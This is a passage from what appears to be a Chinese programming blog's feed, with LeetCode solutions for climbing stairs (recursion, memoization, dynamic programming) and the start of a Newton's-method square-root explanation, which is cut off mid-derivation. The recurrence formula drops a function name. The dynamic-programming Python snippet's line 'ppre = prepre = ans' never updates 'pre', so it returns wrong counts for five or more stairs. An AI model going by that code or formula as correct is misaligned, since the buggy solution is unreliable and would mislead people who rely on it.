style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span></span></span></span>这个函数模拟爬<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>阶和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>阶的情形，并返回两个函数的返回值之和。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>i</mi><mi>m</mi><mi>b</mi><mi>S</mi><mi>t</mi><mi>a</mi><mi>i</mi><mi>r</mi><mi>s</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mi>c</mi><mi>l</mi><mi>i</mi><mi>m</mi><mi>b</mi><mi>S</mi><mi>t</mi><mi>a</mi><mi>i</mi><mi>r</mi><mi>s</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>2</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">climbStairs(i, n)=(i+1, n)+climbStairs(i+2, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>定义了当前阶数，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>定义了目标阶数。</p><ul><li><p>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">n=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>时，递归树是这样的：<br /><img src="https://s2.ax1x.com/2020/02/21/3uEGDK.png" alt="" /></p></li><li><p>Python3实现：</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">return</span> climbStairs(<span class="number">0</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(i, n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; n:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">elif</span> i == n:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> climbStairs(i+<span class="number">1</span>, n) + climbStairs(i+<span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">print</span> (solution(n))</span><br></pre></td></tr></table></figure><h2 id="32-记忆化递归"><a class="markdownIt-Anchor" href="#32-记忆化递归"></a> 3.2 记忆化递归</h2><ul><li><p>在上一种方法中，我们计算每一步的结果时出现了冗余，观察上图的递归树可以看出，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(4,5)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mclose">)</span></span></span></span>在树中出现了许多次，而用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>m</mi><mi>o</mi><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">memo[4]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mopen">[</span><span class="mord">4</span><span class="mclose">]</span></span></span></span>可以直接记忆<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">i=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>时的方法数。因此我们可以把每一步的结果存储在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>m</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">memo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span></span></span></span>数组之中，每当函数再次被调用，我们就直接从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>m</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">memo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span></span></span></span>数组返回结果。</p></li><li><p>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>m</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">memo</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span></span></span></span>数组的帮助下，我们得到了一个修复的递归树，其大小减少到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>。</p></li><li><p>Python3实现：</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span><span class="params">(n)</span>:</span></span><br><span class="line">memo = [<span class="number">0</span>]*n</span><br><span class="line"><span class="keyword">return</span> climbStairs(<span class="number">0</span>, n, memo)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(i, n, memo)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; n:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">elif</span> i == n:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> memo[i] &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> memo[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">memo[i] = climbStairs(i+<span class="number">1</span>, n, memo) + climbStairs(i+<span class="number">2</span>, n, memo)</span><br><span class="line"><span class="keyword">return</span> memo[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">print</span> (solution(n))</span><br></pre></td></tr></table></figure><h2 id="33-动态规划法"><a class="markdownIt-Anchor" href="#33-动态规划法"></a> 3.3 动态规划法</h2><ul><li><p>不难发现，这个问题可以被分解为一些包含最优子结构的子问题，即它的最优解可以从其子问题的最优解来有效地构建，我们可以使用动态规划来解决这一问题。</p></li><li><p>第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>阶可以由以下两种方法得到：</p><ul><li>在第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>阶后向上爬<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>阶。</li><li>在第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i-2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span>阶后向上爬<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>阶。</li></ul></li><li><p>所以到达第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>阶的方法总数就是到第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i−1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>阶和第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mi mathvariant="normal">−</mi><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i−2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mord">2</span><span class="mclose">)</span></span></span></span>阶的方法数之和。</p></li><li><p>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">dp[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span></span></span></span>表示能到达第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>阶的方法总数：</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">dp[i]=dp[i-1]+dp[i-2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span></span></p><ul><li>Python3实现：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="number">1</span>)</span><br><span class="line"><span class="keyword">elif</span> n==<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">pre = <span class="number">2</span></span><br><span class="line">ppre = <span class="number">1</span></span><br><span class="line">times = n<span class="number">-2</span></span><br><span class="line"><span class="keyword">while</span> times:</span><br><span class="line">times -= <span class="number">1</span></span><br><span class="line">ans = pre + ppre</span><br><span class="line">ppre = prepre = ans</span><br><span class="line"><span class="keyword">print</span> (ans)</span><br></pre></td></tr></table></figure><h2 id="34-斐波那契数列"><a class="markdownIt-Anchor" href="#34-斐波那契数列"></a> 3.4 斐波那契数列</h2><ul><li>观察答案序列可知，是一个斐波那契数列，直接套用公式即可，这里不再赘述。</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-69-x的平方根-牛顿迭代法</title>
      <link href="/2020/02/21/LeetCode-69-x%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9-%E7%89%9B%E9%A1%BF%E8%BF%AD%E4%BB%A3%E6%B3%95/"/>
      <url>/2020/02/21/LeetCode-69-x%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9-%E7%89%9B%E9%A1%BF%E8%BF%AD%E4%BB%A3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-题目描述"><a class="markdownIt-Anchor" href="#1-题目描述"></a> 1 题目描述</h1><blockquote><p>实现 int sqrt(int x) 函数。<br />计算并返回 x 的平方根，其中 x 是非负整数。<br />由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p></blockquote><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><blockquote><p>示例 1:<br />输入: 4<br />输出: 2</p></blockquote><blockquote><p>示例 2:<br />输入: 8<br />输出: 2<br />说明: 8 的平方根是 2.82842…, 由于返回类型是整数，小数部分将被舍去。</p></blockquote><h1 id="3-牛顿迭代法"><a class="markdownIt-Anchor" href="#3-牛顿迭代法"></a> 3 牛顿迭代法</h1><ul><li>求x的平方根：首先随便猜一个近似值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>u</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">cur</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>，然后不断令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>u</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">cur</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>等于 <kbd><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>u</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">cur</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">/</mi><mi>c</mi><mi>u</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">x/cur</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord">/</span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span> 的平均数</kbd>，迭代个六七次后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>u</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">cur</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>的值就已经相当精确了。</li></ul><p>例如，我想求根号 2 等于多少。假如我猜测的结果为 4，虽然错的离谱，但你可以看到使用牛顿迭代法后这个值很快就趋近于根号 2 了：</p><blockquote><p>( 4 + 2/ 4 ) / 2 = 2.25<br />( 2.25 + 2/ 2.25 ) / 2 = 1.56944…<br />( 1.56944…+ 2/1.56944…) / 2 = 1.42189…<br />( 1.42189…+ 2/1.42189…) / 2 = 1.41423…<br />….</p></blockquote><p>4<img src="https://img-blog.csdnimg.cn/20191120225747380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" /><br /><strong>算法原理：</strong></p><ul><li>我们不断用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>的切线来逼近方程<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mi>a</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x^{2}-a=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>的根。根号<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>实际上就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mi>a</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x^{2}-a=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>的一个正实根，这个函数的导数是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">2x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">x</span></span></span></span>。也就是说，函数上任一点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>处的切线斜率是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">2x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">x</span></span></span></span>。</li><li>那么，过点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x, f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>的切线与x轴的交点横坐标为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn><mi>x</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation 